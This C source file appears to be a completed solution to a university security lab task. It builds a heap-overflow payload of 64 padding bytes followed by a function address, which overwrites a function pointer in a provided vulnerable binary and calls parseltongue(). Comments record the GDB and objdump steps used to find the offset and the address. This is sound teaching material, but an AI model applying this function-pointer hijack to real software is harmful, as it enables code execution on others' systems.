////////////////////////////////////////////////////////////////////////////////
//
//  File           : cs642-task3.c
//  Description    : Task 3
//
//   Author        : *** INSERT YOUR NAME ***
//   Last Modified : *** DATE ***
//

#include "bufferoverflow_util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Write 8-byte value to memory at location addr+offset
// You will use to write values into your payload - 8-byte at a time
#define pack(addr, offset, value)                                              \
  (*((unsigned long long *)((char *)addr + offset)) = value)

int main(int argc, char **argv) {


    // (1) MEASURE THE HEAP OVERFLOW OFFSET
    //    “Identify how many As you have to use to overflow the buffer
    //     so that f->fp points to parseltongue.”
    //
    //    In GDB we did:
    //      (gdb) p (char*)&f->fp - (char*)&w->name[0]
    //      $1 = 64
    //    That tells us that writing 64 bytes into w->name will land us
    //    exactly on the function pointer f->fp.
    const size_t differenceWizardAndFpOffset = 64;

    // (2) FIND THE TARGET FUNCTION ADDRESS
    //    “Use heap overflow techniques to invoke parseltongue()…”
    //    We disassembled `task3` and located:
    //
    //      $ objdump -d task3 | grep '<parseltongue>'
    //      4011b0 <parseltongue>:
    //
    //    So 0x4011b0 is the entry point of parseltongue().
    const unsigned long long parselMethodReturnPointerLocation = 0x4011b0;

    // (3) BUILD THE PAYLOAD IN MEMORY
    //
    //    Total size = padding (differenceWizardAndFpOffset) + 8 bytes for the
    //    new function pointer value.
    size_t payloadFileSizeInBytes = differenceWizardAndFpOffset + sizeof(unsigned long long);
    char *contentsPayloadFile = malloc(payloadFileSizeInBytes);

    // 3a) Fill the first differenceWizardAndFpOffset bytes with 'A' (0x41).
    //     This corrupts w->name up through to the start of f->fp.
    memset(contentsPayloadFile, 'A', differenceWizardAndFpOffset);

    // 3b) Overwrite the 8 bytes at offset 64 with the address of parseltongue.
    //     When the victim does f->fp(), it will now jump into parseltongue().
    pack(contentsPayloadFile, differenceWizardAndFpOffset, parselMethodReturnPointerLocation);

    // (4) WRITE THE PAYLOAD OUT TO A FILE
    //     The victim binary reads its argument string via strcpy(argv[1]),
    //     so we save our crafted bytes in “task3-payload” for:
    //
    //       ./task3 `cat task3-payload`
    write_to_file("task3-payload", contentsPayloadFile, payloadFileSizeInBytes, FILE_CLEAR);

  exit(0);
}
